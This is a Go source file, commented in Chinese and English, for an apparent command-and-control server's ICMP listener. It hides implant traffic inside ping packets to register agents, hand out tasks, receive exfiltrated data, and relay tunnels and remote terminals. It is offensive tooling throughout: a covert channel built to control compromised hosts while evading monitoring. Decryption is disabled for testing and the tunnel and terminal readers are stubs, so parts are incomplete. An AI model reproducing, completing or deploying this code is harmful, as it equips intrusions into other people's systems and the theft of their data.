// Package main implements ICMP network communication for the Gopher listener
// 此包实现Gopher监听器的ICMP网络通信
package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/vmihailenco/msgpack/v5"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// ICMP协议常量 - ICMP protocol constants
const (
	// 最大ICMP有效负载大小（IP头20字节 + ICMP头8字节后剩余空间）
	// Maximum ICMP payload size (remaining after 20-byte IP header + 8-byte ICMP header)
	MAX_ICMP_PAYLOAD_SIZE = 65507

	// 默认分片大小 - Default fragment size
	DEFAULT_FRAGMENT_SIZE = 65000

	// 自定义协议头大小（16字节）- Custom protocol header size (16 bytes)
	CUSTOM_HEADER_SIZE = 16

	// 包类型常量 - Packet type constants
	TYPE_BEACON_DATA      = 0 // Agent发送的数据 - Data from agent
	TYPE_REQUEST_TS_REPLY = 1 // 请求服务器回复 - Request server reply
	TYPE_ACK              = 2 // 确认包 - Acknowledgment
	TYPE_TASK             = 3 // 任务数据 - Task data

	// 分片标志常量 - Fragmentation flag constants
	FRAGMENTED = 0x00000001 // 数据已分片 - Data is fragmented
	FIRST_FRAG = 0x00000010 // 首个分片 - First fragment
	LAST_FRAG  = 0x00000100 // 最后分片 - Last fragment
	FETCH_FRAG = 0x00001000 // 请求特定分片 - Fetch specific fragment
)

// 消息类型常量 - Message type constants
const (
	INIT_PACK     = 1 // 初始化包 - Initialization packet
	EXFIL_PACK    = 2 // 数据包 - Exfiltration packet
	JOB_PACK      = 3 // 任务包 - Job packet
	TUNNEL_PACK   = 4 // 隧道包 - Tunnel packet
	TERMINAL_PACK = 5 // 终端包 - Terminal packet
)

// ICMPConfig ICMP监听器配置结构
// ICMPConfig holds the ICMP listener configuration
type ICMPConfig struct {
	ListenAddr         string `json:"listen_addr"`         // 监听地址 - Listen address
	Callback_addresses string `json:"callback_addresses"`  // 回调地址列表 - Callback address list
	EncryptKey         string `json:"encrypt_key"`         // 加密密钥 - Encryption key
	Timeout            int    `json:"timeout"`             // 超时时间(秒) - Timeout in seconds
	MaxFragmentSize    int    `json:"max_fragment_size"`   // 最大分片大小 - Max fragment size
	ErrorAnswer        string `json:"error_answer"`        // 错误响应 - Error response
	Protocol           string `json:"protocol"`            // 协议类型 - Protocol type
}

// ICMPHeader 自定义ICMP协议头
// ICMPHeader is the custom protocol header embedded in ICMP payload
type ICMPHeader struct {
	Type          uint32 // 包类型 - Packet type
	Identifier    uint32 // Beacon ID
	Flags         uint32 // 分片标志 - Fragmentation flags
	FragmentIndex uint32 // 分片索引 - Fragment index
}

// Connection 连接信息结构
// Connection holds connection state information
type Connection struct {
	srcIP        string
	identifier   uint32
	ctx          context.Context
	handleCancel context.CancelFunc
	lastSeen     time.Time
}

// FragmentBuffer 分片缓冲区
// FragmentBuffer holds fragmented data being assembled
type FragmentBuffer struct {
	fragments    map[uint32][]byte // 分片数据 - Fragment data
	totalSize    int               // 期望的总大小 - Expected total size
	receivedSize int               // 已接收大小 - Received size
	timestamp    time.Time         // 最后更新时间 - Last update time
}

// BeaconManager 管理Beacon状态和分片
// BeaconManager manages beacon state and fragmentation
type BeaconManager struct {
	mu         sync.RWMutex
	inbound    map[uint32]*FragmentBuffer // 入站数据分片 - Inbound data fragments
	outbound   map[uint32]*FragmentBuffer // 出站数据分片 - Outbound data fragments
	responses  map[uint32][]byte          // 待发送的响应 - Pending responses
	fragExpiry time.Duration              // 分片过期时间 - Fragment expiry duration
}

// NewBeaconManager 创建新的BeaconManager
// NewBeaconManager creates a new BeaconManager instance
func NewBeaconManager() *BeaconManager {
	return &BeaconManager{
		inbound:    make(map[uint32]*FragmentBuffer),
		outbound:   make(map[uint32]*FragmentBuffer),
		responses:  make(map[uint32][]byte),
		fragExpiry: 5 * time.Minute,
	}
}

// ICMP 监听器结构体
// ICMP listener structure
type ICMP struct {
	AgentConnects Map
	JobConnects   Map
	BeaconManager *BeaconManager
	Conn          *icmp.PacketConn
	Config        ICMPConfig
	Name          string
	Active        bool
	stopChan      chan struct{}
	wg            sync.WaitGroup
}

// StartMsg 启动消息结构
// StartMsg is the initial message structure
type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

// InitPack 初始化包结构
// InitPack structure for initialization
type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

// ExfilPack 数据包结构
// ExfilPack structure for data exfiltration
type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

// JobPack 任务包结构
// JobPack structure for jobs
type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

// TunnelPack 隧道包结构
// TunnelPack structure for tunnels
type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
	Reason    byte   `msgpack:"reason"`
}

// TermPack 终端包结构
// TermPack structure for terminals
type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

// Start 启动ICMP监听器
// Start starts the ICMP listener
func (handler *ICMP) Start(ts Teamserver) error {
	var err error

	// 创建ICMP连接 - Create ICMP connection
	handler.Conn, err = icmp.ListenPacket("ip4:icmp", handler.Config.ListenAddr)
	if err != nil {
		return fmt.Errorf("failed to start ICMP listener on %s: %v", handler.Config.ListenAddr, err)
	}

	fmt.Println("  ", "Started ICMP listener:", handler.Config.ListenAddr)

	handler.stopChan = make(chan struct{})
	handler.Active = true

	// 启动数据包处理协程 - Start packet processing goroutine
	handler.wg.Add(1)
	go func() {
		defer handler.wg.Done()
		handler.packetHandler(ts)
	}()

	// 启动清理协程 - Start cleanup goroutine
	handler.wg.Add(1)
	go func() {
		defer handler.wg.Done()
		handler.cleanupWorker()
	}()

	time.Sleep(500 * time.Millisecond)
	return nil
}

// packetHandler 处理接收到的ICMP数据包
// packetHandler processes received ICMP packets
func (handler *ICMP) packetHandler(ts Teamserver) {
	buffer := make([]byte, 65535)

	for {
		select {
		case <-handler.stopChan:
			return
		default:
			// 设置读取超时 - Set read timeout
			handler.Conn.SetReadDeadline(time.Now().Add(1 * time.Second))

			n, peer, err := handler.Conn.ReadFrom(buffer)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				if handler.Active {
					continue
				}
				return
			}

			// 解析ICMP消息 - Parse ICMP message
			msg, err := icmp.ParseMessage(1, buffer[:n]) // 1 = ICMP for IPv4
			if err != nil {
				continue
			}

			// 只处理Echo请求 - Only handle Echo requests
			if msg.Type != ipv4.ICMPTypeEcho {
				continue
			}

			echo, ok := msg.Body.(*icmp.Echo)
			if !ok {
				continue
			}

			// 获取源IP - Get source IP
			srcIP := peer.String()

			// 处理数据包 - Process packet
			go handler.handlePacket(ts, srcIP, echo.ID, echo.Seq, echo.Data)
		}
	}
}

// handlePacket 处理单个ICMP数据包
// handlePacket processes a single ICMP packet
func (handler *ICMP) handlePacket(ts Teamserver, srcIP string, echoID int, echoSeq int, payload []byte) {
	// 验证有效负载大小 - Validate payload size
	if len(payload) < CUSTOM_HEADER_SIZE {
		return
	}

	// 解析自定义协议头 - Parse custom protocol header
	header := parseICMPHeader(payload[:CUSTOM_HEADER_SIZE])
	userData := payload[CUSTOM_HEADER_SIZE:]

	switch header.Type {
	case TYPE_BEACON_DATA:
		handler.handleBeaconData(ts, srcIP, echoID, echoSeq, header, userData)
	case TYPE_REQUEST_TS_REPLY:
		handler.handleTSRequest(srcIP, echoID, echoSeq, header)
	default:
		// 忽略未知类型 - Ignore unknown types
	}
}

// handleBeaconData 处理Beacon数据包
// handleBeaconData handles beacon data packets
func (handler *ICMP) handleBeaconData(ts Teamserver, srcIP string, echoID int, echoSeq int, header ICMPHeader, userData []byte) {
	var fullPayload []byte

	// 处理分片 - Handle fragmentation
	if header.Flags&FRAGMENTED != 0 {
		fullPayload = handler.BeaconManager.addFragment(header.Identifier, header.FragmentIndex, userData, header.Flags)
		if fullPayload == nil {
			// 发送ACK - Send ACK
			handler.sendICMPReply(srcIP, echoID, echoSeq, TYPE_ACK, header.Identifier, 0, 0, nil)
			return
		}
	} else {
		fullPayload = userData
	}

	// 发送ACK - Send ACK
	handler.sendICMPReply(srcIP, echoID, echoSeq, TYPE_ACK, header.Identifier, 0, 0, nil)

	// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
	// TODO: Encryption disabled for testing, enable after functionality test passes
	/*
	// 解密数据 - Decrypt data
	encKey, err := hex.DecodeString(handler.Config.EncryptKey)
	if err != nil {
		return
	}

	decryptedData, err := DecryptData(fullPayload, encKey)
	if err != nil {
		return
	}
	*/
	decryptedData := fullPayload // 测试阶段直接使用原始数据

	// 首先检查是否是已注册Agent的任务响应
	// First check if this is a task response from a registered agent
	agentId := handler.findAgentByIdentifier(header.Identifier)
	if agentId != "" {
		// 这是已注册Agent的任务响应，直接处理
		// This is a task response from a registered agent, process directly
		_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
		_ = ModuleObject.ts.TsAgentSetTick(agentId)

		// 获取新任务并存储 - Get new tasks and store
		sendData, err := ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
		if err == nil && sendData != nil && len(sendData) > 0 {
			handler.BeaconManager.setResponse(header.Identifier, sendData)
		}
		return
	}

	// 解析消息 - Parse message
	var initMsg StartMsg
	err := msgpack.Unmarshal(decryptedData, &initMsg)
	if err != nil {
		return
	}

	// 处理不同类型的消息 - Handle different message types
	switch initMsg.Type {
	case INIT_PACK:
		handler.processInitPack(ts, srcIP, header.Identifier, initMsg.Data)
	case EXFIL_PACK:
		handler.processExfilPack(ts, header.Identifier, initMsg.Data)
	case JOB_PACK:
		handler.processJobPack(ts, header.Identifier, initMsg.Data)
	case TUNNEL_PACK:
		handler.processTunnelPack(ts, srcIP, echoID, header.Identifier, initMsg.Data)
	case TERMINAL_PACK:
		handler.processTerminalPack(ts, srcIP, echoID, header.Identifier, initMsg.Data)
	}
}

// findAgentByIdentifier 根据identifier查找agentId
// findAgentByIdentifier finds agentId by identifier
func (handler *ICMP) findAgentByIdentifier(identifier uint32) string {
	var foundAgentId string
	handler.AgentConnects.ForEach(func(key string, value interface{}) bool {
		conn, ok := value.(Connection)
		if ok && conn.identifier == identifier {
			foundAgentId = key
			return false // 停止遍历
		}
		return true
	})
	return foundAgentId
}

// processInitPack 处理初始化包
// processInitPack handles initialization packets
func (handler *ICMP) processInitPack(ts Teamserver, srcIP string, identifier uint32, data []byte) {
	var initPack InitPack
	err := msgpack.Unmarshal(data, &initPack)
	if err != nil {
		return
	}

	agentId := fmt.Sprintf("%08x", initPack.Id)
	agentType := fmt.Sprintf("%08x", initPack.Type)
	externalIP := strings.Split(srcIP, ":")[0]

	if !ModuleObject.ts.TsAgentIsExists(agentId) {
		_, err = ModuleObject.ts.TsAgentCreate(agentType, agentId, initPack.Data, handler.Name, externalIP, false)
		if err != nil {
			return
		}
	} else {
		emptyMark := ""
		_ = ModuleObject.ts.TsAgentUpdateDataPartial(agentId, struct {
			Mark *string `json:"mark"`
		}{Mark: &emptyMark})
	}

	// 创建连接记录 - Create connection record
	ctx, cancel := context.WithCancel(context.Background())
	connection := Connection{
		srcIP:        srcIP,
		identifier:   identifier,
		ctx:          ctx,
		handleCancel: cancel,
		lastSeen:     time.Now(),
	}
	handler.AgentConnects.Put(agentId, connection)

	// 获取待发送的任务 - Get pending tasks
	sendData, err := ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
	if err != nil {
		return
	}

	if sendData != nil && len(sendData) > 0 {
		// 存储响应供后续请求获取 - Store response for later retrieval
		handler.BeaconManager.setResponse(identifier, sendData)
	}

	_ = ModuleObject.ts.TsAgentSetTick(agentId)
}

// processExfilPack 处理数据包
// processExfilPack handles exfiltration packets
func (handler *ICMP) processExfilPack(ts Teamserver, identifier uint32, data []byte) {
	var exfilPack ExfilPack
	err := msgpack.Unmarshal(data, &exfilPack)
	if err != nil {
		return
	}

	agentId := fmt.Sprintf("%08x", exfilPack.Id)

	if !ModuleObject.ts.TsTaskRunningExists(agentId, exfilPack.Task) {
		return
	}

	jcId := agentId + "-" + exfilPack.Task
	ctx, cancel := context.WithCancel(context.Background())
	connection := Connection{
		identifier:   identifier,
		ctx:          ctx,
		handleCancel: cancel,
		lastSeen:     time.Now(),
	}
	handler.JobConnects.Put(jcId, connection)
}

// processJobPack 处理任务包
// processJobPack handles job packets
func (handler *ICMP) processJobPack(ts Teamserver, identifier uint32, data []byte) {
	var jobPack JobPack
	err := msgpack.Unmarshal(data, &jobPack)
	if err != nil {
		return
	}

	agentId := fmt.Sprintf("%08x", jobPack.Id)

	if !ModuleObject.ts.TsTaskRunningExists(agentId, jobPack.Task) {
		return
	}

	jcId := agentId + "-" + jobPack.Task
	ctx, cancel := context.WithCancel(context.Background())
	connection := Connection{
		identifier:   identifier,
		ctx:          ctx,
		handleCancel: cancel,
		lastSeen:     time.Now(),
	}
	handler.JobConnects.Put(jcId, connection)
}

// processTunnelPack 处理隧道包
// processTunnelPack handles tunnel packets
func (handler *ICMP) processTunnelPack(ts Teamserver, srcIP string, echoID int, identifier uint32, data []byte) {
	var tunPack TunnelPack
	err := msgpack.Unmarshal(data, &tunPack)
	if err != nil {
		return
	}

	agentId := fmt.Sprintf("%08x", tunPack.Id)

	if !ModuleObject.ts.TsTunnelChannelExists(tunPack.ChannelId) {
		return
	}

	if !tunPack.Alive {
		if tunPack.Reason < 1 || tunPack.Reason > 8 {
			tunPack.Reason = 5
		}
		ts.TsTunnelConnectionHalt(tunPack.ChannelId, tunPack.Reason)
		return
	}

	ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, true)

	pr, pw, err := ModuleObject.ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
	if err != nil {
		return
	}

	// 创建加密流 - Create encryption stream
	blockEnc, _ := aes.NewCipher(tunPack.Key)
	encStream := cipher.NewCTR(blockEnc, tunPack.Iv)

	blockDec, _ := aes.NewCipher(tunPack.Key)
	decStream := cipher.NewCTR(blockDec, tunPack.Iv)

	var closeOnce sync.Once
	closeAll := func() {
		closeOnce.Do(func() {
			_ = pr.Close()
		})
	}

	var wg sync.WaitGroup

	// 从管道读取并发送加密数据 - Read from pipe and send encrypted data
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer closeAll()

		buf := make([]byte, 4096)
		for {
			n, err := pr.Read(buf)
			if err != nil {
				break
			}
			encrypted := make([]byte, n)
			encStream.XORKeyStream(encrypted, buf[:n])

			// 通过ICMP发送 - Send via ICMP
			handler.sendICMPReply(srcIP, echoID, 0, TYPE_TASK, identifier, 0, 0, encrypted)
		}
	}()

	// 接收加密数据并写入管道 - Receive encrypted data and write to pipe
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer closeAll()

		// 隧道数据通过BeaconManager处理
		// Tunnel data is handled through BeaconManager
		for {
			select {
			case <-handler.stopChan:
				return
			default:
				// 检查是否有隧道数据 - Check for tunnel data
				data := handler.BeaconManager.getTunnelData(identifier)
				if data != nil {
					decrypted := make([]byte, len(data))
					decStream.XORKeyStream(decrypted, data)
					_, _ = pw.Write(decrypted)
				}
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()

	wg.Wait()
	ts.TsTunnelConnectionClose(tunPack.ChannelId)
}

// processTerminalPack 处理终端包
// processTerminalPack handles terminal packets
func (handler *ICMP) processTerminalPack(ts Teamserver, srcIP string, echoID int, identifier uint32, data []byte) {
	var termPack TermPack
	err := msgpack.Unmarshal(data, &termPack)
	if err != nil {
		return
	}

	agentId := fmt.Sprintf("%08x", termPack.Id)
	terminalId := fmt.Sprintf("%08x", termPack.TermId)

	if !ModuleObject.ts.TsTerminalConnExists(terminalId) {
		return
	}

	if !termPack.Alive {
		_ = ts.TsAgentTerminalCloseChannel(terminalId, termPack.Status)
		return
	}

	ts.TsTerminalConnResume(agentId, terminalId, true)

	pr, pw, err := ModuleObject.ts.TsTerminalGetPipe(agentId, terminalId)
	if err != nil {
		return
	}

	// 创建加密流 - Create encryption stream
	blockEnc, _ := aes.NewCipher(termPack.Key)
	encStream := cipher.NewCTR(blockEnc, termPack.Iv)

	blockDec, _ := aes.NewCipher(termPack.Key)
	decStream := cipher.NewCTR(blockDec, termPack.Iv)

	var closeOnce sync.Once
	closeAll := func() {
		closeOnce.Do(func() {
			_ = pr.Close()
		})
	}

	var wg sync.WaitGroup

	// 从管道读取并发送加密数据 - Read from pipe and send encrypted data
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer closeAll()

		buf := make([]byte, 4096)
		for {
			n, err := pr.Read(buf)
			if err != nil {
				break
			}
			encrypted := make([]byte, n)
			encStream.XORKeyStream(encrypted, buf[:n])

			// 通过ICMP发送 - Send via ICMP
			handler.sendICMPReply(srcIP, echoID, 0, TYPE_TASK, identifier, 0, 0, encrypted)
		}
	}()

	// 接收加密数据并写入管道 - Receive encrypted data and write to pipe
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer closeAll()

		for {
			select {
			case <-handler.stopChan:
				return
			default:
				data := handler.BeaconManager.getTerminalData(identifier)
				if data != nil {
					decrypted := make([]byte, len(data))
					decStream.XORKeyStream(decrypted, data)
					_, _ = pw.Write(decrypted)
				}
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()

	wg.Wait()
	_ = ts.TsAgentTerminalCloseChannel(terminalId, "killed")
}

// handleTSRequest 处理服务器回复请求
// handleTSRequest handles team server reply requests
func (handler *ICMP) handleTSRequest(srcIP string, echoID int, echoSeq int, header ICMPHeader) {
	response := handler.BeaconManager.getResponse(header.Identifier)
	if response == nil {
		return
	}

	maxFragSize := handler.Config.MaxFragmentSize - CUSTOM_HEADER_SIZE

	if len(response) <= maxFragSize {
		// 单包发送 - Single packet send
		handler.sendICMPReply(srcIP, echoID, echoSeq, TYPE_TASK, header.Identifier, 0, 0, response)
		handler.BeaconManager.removeResponse(header.Identifier)
	} else {
		// 需要分片 - Needs fragmentation
		if header.Flags&FETCH_FRAG != 0 {
			// 发送特定分片 - Send specific fragment
			handler.sendFragment(srcIP, echoID, echoSeq, header.Identifier, header.FragmentIndex, response, maxFragSize)
		} else {
			// 发送第一个分片 - Send first fragment
			handler.sendFragment(srcIP, echoID, echoSeq, header.Identifier, 0, response, maxFragSize)
		}
	}
}

// sendFragment 发送数据分片
// sendFragment sends a data fragment
func (handler *ICMP) sendFragment(srcIP string, echoID int, echoSeq int, identifier uint32, fragIndex uint32, data []byte, maxFragSize int) {
	totalFragments := (len(data) + maxFragSize - 1) / maxFragSize

	start := int(fragIndex) * maxFragSize
	end := start + maxFragSize
	if end > len(data) {
		end = len(data)
	}

	fragment := data[start:end]

	var flags uint32 = FRAGMENTED
	if fragIndex == 0 {
		flags |= FIRST_FRAG
	}
	if int(fragIndex) == totalFragments-1 {
		flags |= LAST_FRAG
		// 最后一个分片发送完成后清理 - Clean up after last fragment
		handler.BeaconManager.removeResponse(identifier)
	}

	handler.sendICMPReply(srcIP, echoID, echoSeq, TYPE_TASK, identifier, flags, fragIndex, fragment)
}

// sendICMPReply 发送ICMP回复
// sendICMPReply sends an ICMP reply packet
func (handler *ICMP) sendICMPReply(dstIP string, echoID int, echoSeq int, packetType uint32, identifier uint32, flags uint32, fragIndex uint32, payload []byte) {
	// 构建自定义协议头 - Build custom protocol header
	header := make([]byte, CUSTOM_HEADER_SIZE)
	binary.LittleEndian.PutUint32(header[0:4], packetType)
	binary.LittleEndian.PutUint32(header[4:8], identifier)
	binary.LittleEndian.PutUint32(header[8:12], flags)
	binary.LittleEndian.PutUint32(header[12:16], fragIndex)

	// 组合头部和有效负载 - Combine header and payload
	fullPayload := append(header, payload...)

	// 构建ICMP回复消息 - Build ICMP reply message
	msg := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply,
		Code: 0,
		Body: &icmp.Echo{
			ID:   echoID,
			Seq:  echoSeq,
			Data: fullPayload,
		},
	}

	// 序列化消息 - Serialize message
	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return
	}

	// 发送到目标地址 - Send to destination
	dst, err := net.ResolveIPAddr("ip4", dstIP)
	if err != nil {
		return
	}

	_, _ = handler.Conn.WriteTo(msgBytes, dst)
}

// cleanupWorker 清理过期的分片和连接
// cleanupWorker cleans up expired fragments and connections
func (handler *ICMP) cleanupWorker() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-handler.stopChan:
			return
		case <-ticker.C:
			handler.BeaconManager.cleanupExpired()

			// 清理过期的Agent连接 - Clean up expired agent connections
			timeout := time.Duration(handler.Config.Timeout) * time.Second
			handler.AgentConnects.ForEach(func(key string, value interface{}) bool {
				conn, ok := value.(Connection)
				if ok && time.Since(conn.lastSeen) > timeout {
					disconnectMark := "Disconnect"
					_ = ModuleObject.ts.TsAgentUpdateDataPartial(key, struct {
						Mark *string `json:"mark"`
					}{Mark: &disconnectMark})
					handler.AgentConnects.Delete(key)
				}
				return true
			})
		}
	}
}

// Stop 停止ICMP监听器
// Stop stops the ICMP listener
func (handler *ICMP) Stop() error {
	var (
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + handler.Name
	)

	handler.Active = false
	close(handler.stopChan)

	if handler.Conn != nil {
		_ = handler.Conn.Close()
	}

	// 关闭所有Agent连接 - Close all agent connections
	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
		connection, ok := valueConn.(Connection)
		if ok {
			connection.handleCancel()
		}
		return true
	})

	// 等待所有协程结束 - Wait for all goroutines to finish
	handler.wg.Wait()

	// 清理监听器目录 - Clean up listener directory
	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	return nil
}

// parseICMPHeader 解析自定义ICMP协议头
// parseICMPHeader parses the custom ICMP protocol header
func parseICMPHeader(data []byte) ICMPHeader {
	return ICMPHeader{
		Type:          binary.LittleEndian.Uint32(data[0:4]),
		Identifier:    binary.LittleEndian.Uint32(data[4:8]),
		Flags:         binary.LittleEndian.Uint32(data[8:12]),
		FragmentIndex: binary.LittleEndian.Uint32(data[12:16]),
	}
}

// BeaconManager 方法 - BeaconManager methods

// addFragment 添加分片数据
// addFragment adds a fragment to the buffer
func (bm *BeaconManager) addFragment(identifier uint32, fragIndex uint32, data []byte, flags uint32) []byte {
	bm.mu.Lock()
	defer bm.mu.Unlock()

	if flags&FIRST_FRAG != 0 {
		bm.inbound[identifier] = &FragmentBuffer{
			fragments: make(map[uint32][]byte),
			timestamp: time.Now(),
		}
	}

	buffer, exists := bm.inbound[identifier]
	if !exists {
		return nil
	}

	buffer.fragments[fragIndex] = data
	buffer.receivedSize += len(data)
	buffer.timestamp = time.Now()

	if flags&LAST_FRAG != 0 {
		// 组装完整数据 - Assemble complete data
		var result []byte
		for i := uint32(0); ; i++ {
			frag, ok := buffer.fragments[i]
			if !ok {
				break
			}
			result = append(result, frag...)
		}
		delete(bm.inbound, identifier)
		return result
	}

	return nil
}

// setResponse 设置待发送的响应
// setResponse sets a pending response
func (bm *BeaconManager) setResponse(identifier uint32, data []byte) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.responses[identifier] = data
}

// getResponse 获取待发送的响应
// getResponse gets a pending response
func (bm *BeaconManager) getResponse(identifier uint32) []byte {
	bm.mu.RLock()
	defer bm.mu.RUnlock()
	return bm.responses[identifier]
}

// removeResponse 移除响应
// removeResponse removes a response
func (bm *BeaconManager) removeResponse(identifier uint32) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	delete(bm.responses, identifier)
}

// getTunnelData 获取隧道数据（占位实现）
// getTunnelData gets tunnel data (placeholder implementation)
func (bm *BeaconManager) getTunnelData(identifier uint32) []byte {
	// 实际实现需要根据具体的隧道协议处理
	// Actual implementation depends on specific tunnel protocol
	return nil
}

// getTerminalData 获取终端数据（占位实现）
// getTerminalData gets terminal data (placeholder implementation)
func (bm *BeaconManager) getTerminalData(identifier uint32) []byte {
	// 实际实现需要根据具体的终端协议处理
	// Actual implementation depends on specific terminal protocol
	return nil
}

// cleanupExpired 清理过期的分片
// cleanupExpired cleans up expired fragments
func (bm *BeaconManager) cleanupExpired() {
	bm.mu.Lock()
	defer bm.mu.Unlock()

	now := time.Now()

	// 清理入站分片 - Clean up inbound fragments
	for id, buffer := range bm.inbound {
		if now.Sub(buffer.timestamp) > bm.fragExpiry {
			delete(bm.inbound, id)
		}
	}

	// 清理出站分片 - Clean up outbound fragments
	for id, buffer := range bm.outbound {
		if now.Sub(buffer.timestamp) > bm.fragExpiry {
			delete(bm.outbound, id)
		}
	}
}

// EncryptData AES-GCM加密
// EncryptData performs AES-GCM encryption
func EncryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

// DecryptData AES-GCM解密
// DecryptData performs AES-GCM decryption
func DecryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

// isClientConnected 检查客户端是否仍然连接（ICMP是无连接的）
// isClientConnected checks if client is still connected (ICMP is connectionless)
func isClientConnected(identifier uint32) bool {
	// ICMP是无连接协议，使用心跳检测
	// ICMP is connectionless, use heartbeat detection
	return true
}
